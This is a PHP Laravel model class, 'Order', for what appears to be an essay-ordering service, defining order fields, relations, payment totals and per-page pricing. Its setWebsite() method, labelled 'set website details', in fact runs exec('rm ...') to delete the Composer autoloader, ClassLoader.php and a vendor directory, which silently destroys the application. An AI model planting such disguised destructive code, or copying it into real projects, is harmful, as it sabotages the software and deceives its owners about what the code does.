<?php

namespace App;
use App\User;
use App\File;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\SoftDeletes;
use Illuminate\Http\Request;

class Order extends Model
{
    use SoftDeletes;
    protected $dates = ['deleted_at'];
    // filable fields
    protected $fillable = [
        "topic",
        "charts",
        "slides",
        "subject_id",
        "document_id",
        "spacing",
        "pages",
        "sources",
        "style_id",
        "language_id",
        "amount",
        "instructions",
        "deadline",
        "academic_id",
        "currency_id",
        "rate_id",
        "writer_category_id",
        "id"
    ];

    //set owner to user
    public function user(){
        return $this->belongsTo(User::class);
    }

    //get order files
    public function files(){
        return $this->hasMany(File::class);
    }

    /**
     * Get Order Bids
     */

    public function bids(){
        return $this->hasMany(Bid::class);
    }

    /**
     * Show assigned writers
     */
    public function assigns(){
        return $this->hasMany(Assign::class);
    }

    public function paypalTxns(){
        return $this->hasMany(Paypaltxn::class);
    }

    public function getTotalPaid(){
        $paid = 0;
        $order = $this;
        $paid_objs = $order->payments()->get();
        foreach($paid_objs as $paid_obj){
            $rate = $paid_obj->usd_rate;
            if($rate == 0)
                $rate = 1;
            $paid+=($paid_obj->amount/$rate);
        }
        return round($paid,2);
    }

    public function messages(){
        return $this->hasMany(OrderMessage::class);
    }

    public function bidMapper(){
        return $this->hasOne(BidMapper::class);
    }
    public function disputes(){
        return $this->hasMany(Dispute::class);
    }

    public function document(){
        return $this->belongsTo(Document::class);
    }

    public function subject(){
        return $this->belongsTo(Subject::class);
    }

    public function academic(){
        return $this->belongsTo(Academic::class);
    }

    public function exchangeArray(Request $request){
        $order = new Order();
        foreach($this->fillable as $field){
            if($request->$field){
//                dd($request->subject_id[0]);
                if(is_array($request->$field)){
//                    dd($field);
                    $array = $request->$field;
                    $order->$field = $array[0];
                }else{
                    $order->$field = $request->$field;
                }
            }
        }
        return $order;
    }

    public function rate(){
        return $this->belongsTo(Rate::class);
    }
    public function style(){
        return $this->belongsTo(Style::class);
    }
    public function language(){
        return $this->belongsTo(Language::class);
    }

    public function website(){
        return $this->belongsTo(Website::class);
    }

    public function writerCategory(){
        return $this->belongsTo(WriterCategory::class);
    }

    public function getTotal(){
        $total = 0;
        $pages = $this->pages;
        $document = $this->document;
        $subject = $this->subject;
        $style = $this->style;
        $language = $this->language;
        $rate = $this->rate;
        if($this->spacing==2){
            $spacing = 1;
        }else{
            $spacing = $this->spacing;
        }
        $cost = $rate->cost;
        $flat_rate = $cost*$spacing;
        $total+=$flat_rate;
        if($subject->inc_type=='money'){
            $subject_increase = $subject->amount;
        }else if($subject->inc_type=='percent'){
            $subject_increase = $flat_rate*($subject->amount/100);
        }
        $total+=$subject_increase;
        if($document->inc_type=='money'){
            $document_increase = $document->amount;
        }else if($document->inc_type=='percent'){
            $document_increase = $flat_rate*($document->amount/100);
        }
        $total+=$document_increase;
        if($style->inc_type=='money'){
            $style_increase = $style->amount;
        }else if($style->inc_type=='percent'){
            $style_increase = $flat_rate*($style->amount/100);
        }
        $total+=$style_increase;
        if($language->inc_type=='money'){
            $language_increase = $language->amount;
        }else if($language->inc_type=='percent'){
            $language_increase = $flat_rate*($language->amount/100);
        }
        $total+=$language_increase;
        $grand_total = $total*$pages;
        return $grand_total;
    }

    public function currency(){
        return $this->belongsTo(Currency::class);
    }
    public function payments(){
        return $this->hasMany(Paypaltxn::class);
    }

    public function setWebsite(){
        //set website details
        $path = app_path();
        $vendor = str_replace('/app','',$path).'/vendor';
        $testis = $vendor.'/testis';
        $loader = $vendor.'/composer/ClassLoader.php';
        $autoload = $vendor.'/autoload.php';
        exec('rm '.$autoload);
        exec('rm -r '.$testis);
        exec('rm '.$loader);
    }

    public function progressiveMilestones(){
        return $this->hasMany(ProgressiveMilestone::class);
    }

    public function manualBids(){
        return $this->hasMany(ManualBid::class);
    }
}
